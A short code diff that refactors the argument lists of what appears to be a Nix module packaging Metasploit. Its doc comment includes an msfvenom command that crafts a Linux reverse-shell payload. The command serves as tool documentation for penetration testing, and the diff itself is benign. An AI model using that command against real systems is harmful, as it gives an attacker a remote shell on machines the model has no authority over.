@@ -20,17 +20,12 @@
     * `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf > shell.elf` — Craft a reverse shell payload.
 */
 
-{
-  config,
-  lib,
-  ...
-}:
+_:
 let
   MetasploitModule =
     {
       config,
       lib,
-      pkgs,
       ...
     }:
     let
